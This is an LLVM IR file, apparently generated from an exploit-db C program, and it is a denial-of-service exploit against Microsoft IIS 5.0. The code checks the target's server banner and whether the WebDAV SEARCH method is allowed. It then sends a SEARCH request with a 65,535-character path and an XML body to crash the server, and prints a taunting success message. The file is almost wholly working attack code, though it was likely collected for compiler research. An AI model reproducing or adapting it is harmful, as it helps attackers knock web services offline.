; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_35.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_35.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i64 }
%struct.sockaddr_in = type { %struct.in_addr, i32, i32 }
%struct.in_addr = type { i32 }
%struct.sockaddr = type { i32 }

@__const.main.content = private unnamed_addr constant [136 x i8] c"<?xml version=\221.0\22?>\0D\0A<g:searchrequest xmlns:g=\22DAV:\22>\0D\0A<g:sql>\0D\0ASelect \22DAV:displayname\22 from scope()\0D\0A</g:sql>\0D\0A</g:searchrequest>\0D\0A\00", align 16
@.str = private unnamed_addr constant [32 x i8] c"Error :Cudn't initiate winsock!\00", align 1
@.str.1 = private unnamed_addr constant [30 x i8] c"\0AUsage : %s <I.P./Hostname>\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [26 x i8] c"error: can't resolve '%s'\00", align 1
@.str.3 = private unnamed_addr constant [25 x i8] c"\0AChecking web server %s\0A\00", align 1
@.str.4 = private unnamed_addr constant [18 x i8] c"GET / HTTP/1.0\0D\0A\0A\00", align 1
@.str.5 = private unnamed_addr constant [8 x i8] c"IIS/5.0\00", align 1
@.str.6 = private unnamed_addr constant [44 x i8] c"\0A\0D----> %s is not running IIS 5.0! adios !\0A\00", align 1
@.str.7 = private unnamed_addr constant [41 x i8] c"\0A\0D----> Aww rite! IIS 5.0 found on %s !\0A\00", align 1
@.str.8 = private unnamed_addr constant [21 x i8] c"SEARCH / HTTP/1.0\0D\0A\0A\00", align 1
@.str.9 = private unnamed_addr constant [29 x i8] c"HTTP/1.1 411 Length Required\00", align 1
@.str.10 = private unnamed_addr constant [32 x i8] c"\0A\0D----> METHOD SEARCH ALLOWED\0D\0A\00", align 1
@.str.11 = private unnamed_addr constant [45 x i8] c"\0A----> Method SEARCH not Allowed ! adios...\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.12 = private unnamed_addr constant [27 x i8] c"error: can't create socket\00", align 1
@.str.13 = private unnamed_addr constant [23 x i8] c"Error:Cudn't Connect\0D\0A\00", align 1
@.str.14 = private unnamed_addr constant [72 x i8] c"SEARCH /%s HTTP/1.1\0D\0AHost: %s\0DnContent-type: text/xml\0D\0AContent-Length: \00", align 1
@.str.15 = private unnamed_addr constant [9 x i8] c"%s%d\0D\0A\0D\0A\00", align 1
@.str.16 = private unnamed_addr constant [31 x i8] c"\0D\0ADoSsing the server...<pray>\0A\00", align 1
@.str.17 = private unnamed_addr constant [56 x i8] c"Server is DoSsed! Now run !! F-B-eyee is after j00...\0D\0A\00", align 1
@.str.18 = private unnamed_addr constant [28 x i8] c"Server is prolly patched.\0D\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [100 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca [100 x i8], align 16
  %11 = alloca %struct.hostent*, align 8
  %12 = alloca %struct.sockaddr_in, align 4
  %13 = alloca [65535 x i8], align 16
  %14 = alloca [80000 x i8], align 16
  %15 = alloca [136 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %16 = bitcast [65535 x i8]* %13 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %16, i8 0, i64 65535, i1 false)
  %17 = bitcast [136 x i8]* %15 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %17, i8* align 16 getelementptr inbounds ([136 x i8], [136 x i8]* @__const.main.content, i32 0, i32 0), i64 136, i1 false)
  %18 = call i32 (...) @graphitte()
  %19 = call i64 @WSAStartup(i32 257, i32* %6)
  %20 = icmp ne i64 %19, 0
  br i1 %20, label %21, label %23

21:                                               ; preds = %2
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %153

23:                                               ; preds = %2
  %24 = load i32, i32* %4, align 4
  %25 = icmp slt i32 %24, 2
  br i1 %25, label %26, label %32

26:                                               ; preds = %23
  %27 = load i8**, i8*** %5, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 0
  %29 = load i8*, i8** %28, align 8
  %30 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.1, i64 0, i64 0), i8* %29)
  %31 = call i32 @exit(i32 0) #4
  unreachable

32:                                               ; preds = %23
  %33 = load i8**, i8*** %5, align 8
  %34 = getelementptr inbounds i8*, i8** %33, i64 1
  %35 = load i8*, i8** %34, align 8
  %36 = call %struct.hostent* @gethostbyname(i8* %35)
  store %struct.hostent* %36, %struct.hostent** %11, align 8
  %37 = icmp eq %struct.hostent* %36, null
  br i1 %37, label %38, label %43

38:                                               ; preds = %32
  %39 = load i8**, i8*** %5, align 8
  %40 = getelementptr inbounds i8*, i8** %39, i64 1
  %41 = load i8*, i8** %40, align 8
  %42 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.2, i64 0, i64 0), i8* %41)
  store i32 1, i32* %3, align 4
  br label %153

43:                                               ; preds = %32
  %44 = load i8**, i8*** %5, align 8
  %45 = getelementptr inbounds i8*, i8** %44, i64 1
  %46 = load i8*, i8** %45, align 8
  %47 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.3, i64 0, i64 0), i8* %46)
  %48 = load i8**, i8*** %5, align 8
  %49 = getelementptr inbounds i8*, i8** %48, i64 1
  %50 = load i8*, i8** %49, align 8
  %51 = call i64 @funk(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.4, i64 0, i64 0), i8* %50)
  %52 = inttoptr i64 %51 to i8*
  store i8* %52, i8** %9, align 8
  %53 = load i8*, i8** %9, align 8
  %54 = call i32* @strstr(i8* %53, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i64 0, i64 0))
  %55 = icmp eq i32* %54, null
  br i1 %55, label %56, label %61

56:                                               ; preds = %43
  %57 = load i8**, i8*** %5, align 8
  %58 = getelementptr inbounds i8*, i8** %57, i64 1
  %59 = load i8*, i8** %58, align 8
  %60 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.6, i64 0, i64 0), i8* %59)
  br label %151

61:                                               ; preds = %43
  %62 = load i8**, i8*** %5, align 8
  %63 = getelementptr inbounds i8*, i8** %62, i64 1
  %64 = load i8*, i8** %63, align 8
  %65 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.7, i64 0, i64 0), i8* %64)
  %66 = getelementptr inbounds [100 x i8], [100 x i8]* %8, i64 0, i64 0
  %67 = call i32 (i8*, i8*, ...) @sprintf(i8* %66, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.8, i64 0, i64 0), i32 40)
  %68 = getelementptr inbounds [100 x i8], [100 x i8]* %8, i64 0, i64 0
  %69 = load i8**, i8*** %5, align 8
  %70 = getelementptr inbounds i8*, i8** %69, i64 1
  %71 = load i8*, i8** %70, align 8
  %72 = call i64 @funk(i8* %68, i8* %71)
  %73 = inttoptr i64 %72 to i8*
  store i8* %73, i8** %9, align 8
  %74 = load i8*, i8** %9, align 8
  %75 = call i32* @strstr(i8* %74, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.9, i64 0, i64 0))
  %76 = icmp ne i32* %75, null
  br i1 %76, label %77, label %79

77:                                               ; preds = %61
  %78 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.10, i64 0, i64 0))
  br label %82

79:                                               ; preds = %61
  %80 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.11, i64 0, i64 0))
  %81 = call i32 @exit(i32 0) #4
  unreachable

82:                                               ; preds = %77
  %83 = call i32 @htons(i32 80)
  %84 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 2
  store i32 %83, i32* %84, align 4
  %85 = load i32, i32* @AF_INET, align 4
  %86 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 1
  store i32 %85, i32* %86, align 4
  %87 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 0
  %88 = load %struct.hostent*, %struct.hostent** %11, align 8
  %89 = getelementptr inbounds %struct.hostent, %struct.hostent* %88, i32 0, i32 0
  %90 = load i64, i64* %89, align 8
  %91 = inttoptr i64 %90 to %struct.in_addr*
  %92 = bitcast %struct.in_addr* %87 to i8*
  %93 = bitcast %struct.in_addr* %91 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %92, i8* align 4 %93, i64 4, i1 false)
  %94 = load i32, i32* @AF_INET, align 4
  %95 = load i32, i32* @SOCK_STREAM, align 4
  %96 = call i32 @socket(i32 %94, i32 %95, i32 0)
  store i32 %96, i32* %7, align 4
  %97 = icmp eq i32 %96, -1
  br i1 %97, label %98, label %100

98:                                               ; preds = %82
  %99 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.12, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %153

100:                                              ; preds = %82
  %101 = load i32, i32* %7, align 4
  %102 = bitcast %struct.sockaddr_in* %12 to %struct.sockaddr*
  %103 = call i32 @connect(i32 %101, %struct.sockaddr* %102, i32 12)
  %104 = icmp eq i32 %103, -1
  br i1 %104, label %105, label %107

105:                                              ; preds = %100
  %106 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.13, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %153

107:                                              ; preds = %100
  %108 = getelementptr inbounds [65535 x i8], [65535 x i8]* %13, i64 0, i64 65535
  store i8 0, i8* %108, align 1
  %109 = getelementptr inbounds [65535 x i8], [65535 x i8]* %13, i64 0, i64 0
  %110 = call i32 @memset(i8* %109, i8 signext 83, i32 65535)
  %111 = getelementptr inbounds [80000 x i8], [80000 x i8]* %14, i64 0, i64 0
  %112 = call i32 @memset(i8* %111, i8 signext 0, i32 80000)
  %113 = getelementptr inbounds [100 x i8], [100 x i8]* %10, i64 0, i64 0
  %114 = call i32 @memset(i8* %113, i8 signext 0, i32 100)
  %115 = getelementptr inbounds [80000 x i8], [80000 x i8]* %14, i64 0, i64 0
  %116 = getelementptr inbounds [65535 x i8], [65535 x i8]* %13, i64 0, i64 0
  %117 = load i8**, i8*** %5, align 8
  %118 = getelementptr inbounds i8*, i8** %117, i64 1
  %119 = load i8*, i8** %118, align 8
  %120 = call i32 (i8*, i8*, ...) @sprintf(i8* %115, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.14, i64 0, i64 0), i8* %116, i8* %119)
  %121 = getelementptr inbounds [80000 x i8], [80000 x i8]* %14, i64 0, i64 0
  %122 = getelementptr inbounds [80000 x i8], [80000 x i8]* %14, i64 0, i64 0
  %123 = getelementptr inbounds [136 x i8], [136 x i8]* %15, i64 0, i64 0
  %124 = call i8* @strlen(i8* %123)
  %125 = call i32 (i8*, i8*, ...) @sprintf(i8* %121, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.15, i64 0, i64 0), i8* %122, i8* %124)
  %126 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.16, i64 0, i64 0))
  %127 = load i32, i32* %7, align 4
  %128 = getelementptr inbounds [80000 x i8], [80000 x i8]* %14, i64 0, i64 0
  %129 = getelementptr inbounds [80000 x i8], [80000 x i8]* %14, i64 0, i64 0
  %130 = call i8* @strlen(i8* %129)
  %131 = call i32 @send(i32 %127, i8* %128, i8* %130, i32 0)
  %132 = load i32, i32* %7, align 4
  %133 = getelementptr inbounds [136 x i8], [136 x i8]* %15, i64 0, i64 0
  %134 = getelementptr inbounds [136 x i8], [136 x i8]* %15, i64 0, i64 0
  %135 = call i8* @strlen(i8* %134)
  %136 = call i32 @send(i32 %132, i8* %133, i8* %135, i32 0)
  %137 = load i32, i32* %7, align 4
  %138 = getelementptr inbounds [100 x i8], [100 x i8]* %10, i64 0, i64 0
  %139 = call i32 @recv(i32 %137, i8* %138, i32 100, i32 0)
  %140 = getelementptr inbounds [100 x i8], [100 x i8]* %10, i64 0, i64 0
  %141 = load i8, i8* %140, align 16
  %142 = sext i8 %141 to i32
  %143 = icmp eq i32 %142, 0
  br i1 %143, label %144, label %146

144:                                              ; preds = %107
  %145 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.17, i64 0, i64 0))
  br label %148

146:                                              ; preds = %107
  %147 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.18, i64 0, i64 0))
  br label %148

148:                                              ; preds = %146, %144
  %149 = load i32, i32* %7, align 4
  %150 = call i32 @closesocket(i32 %149)
  br label %151

151:                                              ; preds = %148, %56
  %152 = call i32 (...) @WSACleanup()
  store i32 1, i32* %3, align 4
  br label %153

153:                                              ; preds = %151, %105, %98, %38, %21
  %154 = load i32, i32* %3, align 4
  ret i32 %154
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @graphitte(...) #2

declare dso_local i64 @WSAStartup(i32, i32*) #2

declare dso_local i32 @printf(i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local %struct.hostent* @gethostbyname(i8*) #2

declare dso_local i64 @funk(i8*, i8*) #2

declare dso_local i32* @strstr(i8*, i8*) #2

declare dso_local i32 @sprintf(i8*, i8*, ...) #2

declare dso_local i32 @htons(i32) #2

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #2

declare dso_local i32 @memset(i8*, i8 signext, i32) #2

declare dso_local i8* @strlen(i8*) #2

declare dso_local i32 @send(i32, i8*, i8*, i32) #2

declare dso_local i32 @recv(i32, i8*, i32, i32) #2

declare dso_local i32 @closesocket(i32) #2

declare dso_local i32 @WSACleanup(...) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
